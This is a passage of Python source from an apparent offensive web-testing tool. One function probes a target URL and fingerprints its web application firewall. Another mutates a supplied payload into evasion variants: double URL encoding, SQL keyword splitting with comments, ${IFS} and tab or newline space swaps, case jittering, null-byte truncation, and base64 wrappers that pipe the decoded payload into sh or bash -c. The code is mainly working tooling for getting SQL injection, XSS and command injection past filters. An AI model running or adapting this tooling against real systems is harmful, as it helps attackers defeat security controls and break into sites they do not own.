async def probe_waf(url: str) -> Dict[str, Any]:
    """Probe target URL with an adversarial vector and fingerprint the WAF."""
    clean_url = url.strip()
    if not clean_url.startswith(("http://", "https://")):
        clean_url = "http://" + clean_url

    probe_url = clean_url.rstrip("/") + _PROBE_SUFFIX
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    try:
        async with httpx.AsyncClient(verify=False, timeout=8.0) as client:
            resp = await client.get(probe_url, headers=headers, follow_redirects=False)
            status = resp.status_code
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            body_sample = resp.text[:12000].lower()

            for waf_name, sig in _FINGERPRINTS:
                header_hits = [h for h in sig["headers"] if h in headers_lower]
                body_hits = [kw for kw in sig["body"] if kw in body_sample]

                if header_hits or body_hits:
                    confidence = min(
                        100,
                        int((len(header_hits) * 45 + len(body_hits) * 25 + (30 if status in _BLOCK_STATUSES else 0)))
                    )
                    return {
                        "detected": True,
                        "waf": waf_name,
                        "confidence": f"{confidence}%",
                        "status_code": status,
                        "matched_headers": header_hits,
                        "matched_keywords": body_hits,
                        "server_header": resp.headers.get("server", "Unknown"),
                        "probe_url": probe_url,
                        "blocked": status in _BLOCK_STATUSES,
                    }

            if status in _BLOCK_STATUSES:
                return {
                    "detected": True,
                    "waf": "Generic WAF / Security Filter",
                    "confidence": "65%",
                    "status_code": status,
                    "matched_headers": [],
                    "matched_keywords": ["HTTP Block status"],
                    "server_header": resp.headers.get("server", "Unknown"),
                    "probe_url": probe_url,
                    "blocked": True,
                }

            return {
                "detected": False,
                "waf": "None / Not Triggered",
                "confidence": "0%",
                "status_code": status,
                "matched_headers": [],
                "matched_keywords": [],
                "server_header": resp.headers.get("server", "Unknown"),
                "probe_url": probe_url,
                "blocked": False,
            }
    except Exception as e:
        return {
            "detected": False,
            "waf": f"Probe error: {str(e)}",
            "confidence": "0%",
            "status_code": 0,
            "matched_headers": [],
            "matched_keywords": [],
            "server_header": "None",
            "probe_url": probe_url,
            "blocked": False,
            "error": str(e)
        }

def mutate_payload_variants(payload: str) -> List[Dict[str, str]]:
    """Mutate an input payload into multiple high-yield WAF evasion variants."""
    raw = payload.strip()
    if not raw:
        return []

    variants: List[Dict[str, str]] = []

    def add_var(name: str, val: str, desc: str):
        if val and not any(v["payload"] == val for v in variants):
            variants.append({"name": name, "payload": val, "description": desc})

    # 1. Canonical Raw
    add_var("Original Raw", raw, "Original canonical payload")

    # 2. URL Standard Encoding
    add_var("URL Encoded", urllib.parse.quote(raw, safe="=&+"), "Standard %XX encoding for special characters")

    # 3. Double URL Encoding (Bypasses naive reverse-proxy unquote)
    url_enc = urllib.parse.quote(raw, safe="=&+")
    add_var("Double URL Encoded", url_enc.replace("%", "%25"), "Bypasses double-decoding filters in web servers")

    # 4. SQL Keyword Splitting (Inline Comment Injection)
    def _split_kw(m: re.Match[str]) -> str:
        kw = m.group(0)
        mid = len(kw) // 2
        return str(kw[:mid] + "/**/" + kw[mid:])
    
    comment_split = _SQL_KEYWORDS.sub(_split_kw, raw)
    if comment_split != raw:
        add_var("SQL Comment Splitting", comment_split, "Breaks exact keyword regexes: UN/**/ION SE/**/LECT")
        add_var("SQL Hash Comment", raw.replace(" ", "/*#*/"), "Replaces whitespace with inline comment hashes")

    # 5. Whitespace Evasions
    if " " in raw:
        add_var("Space → %0a (Newline)", raw.replace(" ", "%0a"), "Bypasses filters expecting standard whitespace")
        add_var("Space → %09 (Tab)", raw.replace(" ", "%09"), "Bypasses filters ignoring horizontal tabs")
        add_var("Space → ${IFS} (Bash/Command)", raw.replace(" ", "${IFS}"), "Command Injection: Linux internal field separator")
        add_var("Space → /**/ (SQL Comment)", raw.replace(" ", "/**/"), "SQLi: Replaces spaces with SQL block comments")

    # 6. Alternating Case (Jittering)
    def _alt_case(s: str) -> str:
        res = []
        upper = True
        for ch in s:
            if ch.isalpha():
                res.append(ch.upper() if upper else ch.lower())
                upper = not upper
            else:
                res.append(ch)
        return "".join(res)
    
    alt = _alt_case(raw)
    if alt != raw:
        add_var("Alternating Case", alt, "Bypasses case-sensitive string matching (e.g. uNiOn SeLeCt)")

    # 7. Unicode Escapes
    uni = (
        raw.replace("'", "\\u0027")
        .replace('"', "\\u0022")
        .replace("<", "\\u003C")
        .replace(">", "\\u003E")
        .replace(" ", "\\u0020")
    )
    if uni != raw:
        add_var("Unicode Escape", uni, "JSON/JS context escape sequences")

    # 8. HTML Entity Encoding
    html_ent = (
        raw.replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#39;")
    )
    if html_ent != raw:
        add_var("HTML Entity", html_ent, "HTML attribute & XSS context evasion")

    # 9. Null Byte Suffix (%00)
    add_var("Null Byte Appended", raw + "%00", "Truncates string validation in C-based backend parsers")

    # 10. Base64 Wrappers (for Linux command injection)
    import base64
    b64_str = base64.b64encode(raw.encode()).decode()
    add_var("Base64 Pipe (Bash)", f"echo {b64_str}|base64 -d|sh", "Executes payload in memory bypassing character restrictions")
    add_var("Base64 Subshell", f"bash -c \"$(echo {b64_str}|base64 -d)\"", "Command execution via encoded subshell")

    return variants
